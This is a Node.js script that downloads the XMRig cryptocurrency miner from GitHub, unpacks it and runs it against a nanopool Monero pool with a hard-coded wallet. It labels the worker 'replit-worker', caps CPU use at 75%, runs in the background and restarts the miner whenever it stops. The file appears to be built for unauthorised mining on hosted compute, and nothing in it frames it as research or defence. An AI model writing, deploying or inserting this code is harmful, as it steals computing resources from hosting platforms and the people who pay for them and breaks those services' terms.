const { spawn, execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const https = require('https');
const { createWriteStream } = require('fs');
const { pipeline } = require('stream');
const tar = require('tar');

const minerUrl = 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz';
const minerTar = 'xmrig.tar.gz';
const minerFolder = 'xmrig-6.21.0';
const minerBinary = './xmrig';

async function downloadXmrig() {
  if (fs.existsSync(minerBinary)) {
    console.log('[*] XMRig already present. Skipping download.');
    return;
  }

  console.log('[*] XMRig not found. Downloading...');

  await new Promise((resolve, reject) => {
    const file = createWriteStream(minerTar);
    https.get(minerUrl, (response) => {
      if (response.statusCode !== 200) {
        reject(new Error(`Failed to download file: Status ${response.statusCode}`));
        return;
      }
      pipeline(response, file, (err) => {
        if (err) reject(err);
        else resolve();
      });
    }).on('error', reject);
  });

  console.log('[*] Extracting XMRig...');
  try {
    await tar.x({
      file: minerTar,
    });

    fs.renameSync(path.join(minerFolder, 'xmrig'), './xmrig');
    fs.chmodSync('./xmrig', 0o755);

    // Clean up
    fs.rmSync(minerTar);
    fs.rmSync(minerFolder, { recursive: true, force: true });

    console.log('[*] XMRig downloaded and ready.');
  } catch (err) {
    console.error('[!] Extraction failed:', err.message);
    process.exit(1);
  }
}

async function startMining() {
  console.log('[*] Starting XMRig...');

  const pool = 'xmr-eu1.nanopool.org:14444';
  const wallet = '48ahQdgq3V2Vtoh6We2sM1YH6BSQxH4m9T4G38AJkubkYZBxye2B9kWgCHTEYiq5Wyb52xjTYY4CAie75T41iCr91gGZ9UP';
  const workerName = 'replit-worker';
  const email = 'your@email.com';

  const xmrig = spawn(minerBinary, [
    '-o', pool,
    '-u', `${wallet}.${workerName}/${email}`,
    '-p', 'x',
    '--coin', 'monero',
    '--donate-level', '1',
    '--cpu-priority', '5',
    '--max-cpu-usage', '75',
    '--background', // run xmrig in background
  ], { stdio: ['ignore', 'pipe', 'pipe'] });

  xmrig.stdout.on('data', (data) => {
    process.stdout.write(`xmrig: ${data}`);
  });

  xmrig.stderr.on('data', (data) => {
    process.stderr.write(`xmrig error: ${data}`);
  });

  xmrig.on('close', (code) => {
    console.error(`[!] XMRig exited with code ${code}. Restarting in 5 seconds...`);
    setTimeout(startMining, 5000);
  });
}

(async () => {
  try {
    await downloadXmrig();
    await startMining();
  } catch (err) {
    console.error('[!] Fatal Error:', err.message);
    process.exit(1);
  }
})();
